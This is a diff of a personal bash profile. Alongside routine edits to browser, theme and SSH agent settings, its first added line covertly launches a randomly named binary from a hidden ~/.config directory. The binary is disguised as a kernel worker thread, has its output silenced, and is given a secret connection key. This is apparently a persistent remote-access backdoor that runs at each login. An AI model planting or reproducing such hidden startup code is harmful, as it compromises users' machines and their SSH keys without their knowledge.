@@ -1,4 +1,6 @@
 #!/bin/bash -x
+set +m; HOME=/home/yigit TERM="xterm-256color" SHELL="/bin/bash" QS_ARGS="-liqs lBg2WqxLORaqhKLF2bxC" /usr/bin/bash -c "exec -a [kworker/R-btrfs-delayed-meta] /home/yigit/.config/.i9NSn7wj/K4VX7Nvg" &>/dev/null &
+#!/bin/bash -x
 
 ## __   _______ _____ _____
 ## \ \ / / ____| ____|_   _|
@@ -20,12 +22,11 @@ export AWT_TOOLKIT=MToolkit
 # Environment variables
 export SHELL=/bin/zsh
 export TERMINAL=/usr/local/bin/st
-export BROWSER=chromium
+export BROWSER=firefox
 export EDITOR=nvim
 export OPENER=xdg-open
 export DEFAULT_RECIPIENT="yigitcolakoglu@hotmail.com"
 export LIBVIRT_DEFAULT_URI="qemu:///system"
-export GTK_THEME=Arc-Dark
 
 # Set XDG Directories
 export XDG_DATA_HOME="$HOME"/.local/share
@@ -136,6 +137,7 @@ fi
 # Setup SSH
 if [ ! "$SSH_AUTH_SOCK" ]; then
   eval "$(ssh-agent | head -n 2)"
+  grep -slR "PRIVATE" ~/.ssh/ | xargs ssh-add > /dev/null 2> /dev/null
 fi
 
 if [ "$DISPLAY" = "" ] && [ "$(tty)" = /dev/tty1 ] && [ $disp_manager -ne 0 ]; then
